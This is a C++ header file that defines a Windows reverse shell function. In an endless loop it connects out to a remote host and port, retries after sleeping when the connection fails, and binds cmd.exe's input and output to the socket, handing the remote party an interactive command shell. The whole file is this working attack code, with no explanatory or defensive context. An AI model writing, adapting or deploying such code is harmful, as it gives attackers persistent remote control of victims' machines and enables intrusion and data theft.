#pragma once
#define _WIN32_WINNT 0x501
#include "includes.h"

void p2pShell(const char* remoteAddr, int remotePort) {
    while (1) {
        SOCKET lsock;
        sockaddr_in addr;
        WSAData version;
        WSAStartup(MAKEWORD(2, 2), &version);
        lsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        struct hostent *hp = gethostbyname(remoteAddr);
        if (hp==NULL) {
            continue;
        }
        int i=0;
        while ( hp->h_addr_list[i] != 0 ) {
            addr.sin_addr.s_addr = *(u_long *) hp->h_addr_list[i++];
        }
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = inet_addr(remoteAddr);
        addr.sin_port = htons(remotePort);
        if (WSAConnect(lsock, (sockaddr*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            cout<<"Sleeping!";
            Sleep(TIMELEN);
            continue;
        } else {
            char recvData[BUFFER];
            ZeroMemory(&recvData, sizeof(recvData));
            int recvStat = recv(lsock, recvData, BUFFER, 0);

            char proc[] = "C:\\Windows\\system32\\cmd.exe";
            STARTUPINFO sInfo;
            PROCESS_INFORMATION pInfo;
            ZeroMemory(&sInfo, sizeof(sInfo));
            sInfo.cb = sizeof(sInfo);
            sInfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)lsock;
            CreateProcessA(NULL, proc, NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &pInfo);
            WaitForSingleObject(pInfo.hProcess, INFINITE);
            CloseHandle(pInfo.hProcess);
            CloseHandle(pInfo.hThread);
            ZeroMemory(&recvData, sizeof(recvData));
            int recvCode = recv(lsock, recvData, BUFFER, 0);
            if (recvCode <= 0) {
                closesocket(lsock);
                WSACleanup();
                continue;
            }
        }
    }
    return;
}
